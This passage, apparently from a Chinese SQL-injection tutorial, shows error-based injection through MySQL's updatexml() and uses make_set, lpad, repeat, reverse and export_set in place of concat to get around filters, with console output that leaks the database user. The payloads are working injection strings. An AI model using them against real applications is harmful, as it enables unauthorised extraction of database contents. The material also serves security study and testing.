可以用make_set进行替换

```sql
mysql> select updatexml(1,make_set(3,'~',(select user())),1);
```

我们还可以找到类似的函数：lpad()、reverse()、repeat()、export_set()（**lpad()、reverse()、repeat() 这三个函数使用的前提是所查询的值中，必须至少含有一个特殊字符，否则会漏掉一些数据**）。

```sql
mysql> select updatexml(1,lpad('@',30,(select user())),1);
ERROR 1105 (HY000): XPATH syntax error: '@localhostroot@localhostr@'


mysql> select updatexml(1,repeat((select user()),2),1);
ERROR 1105 (HY000): XPATH syntax error: '@localhostroot@localhost'


mysql> select updatexml(1,(select user()),1);
ERROR 1105 (HY000): XPATH syntax error: '@localhost'
mysql> select updatexml(1,reverse((select user())),1);
ERROR 1105 (HY000): XPATH syntax error: '@toor'


mysql> select updatexml(1,export_set(1|2,'::',(select user())),1);
ERROR 1105 (HY000): XPATH syntax error: '::,::,root@localhost,root@localh'
```

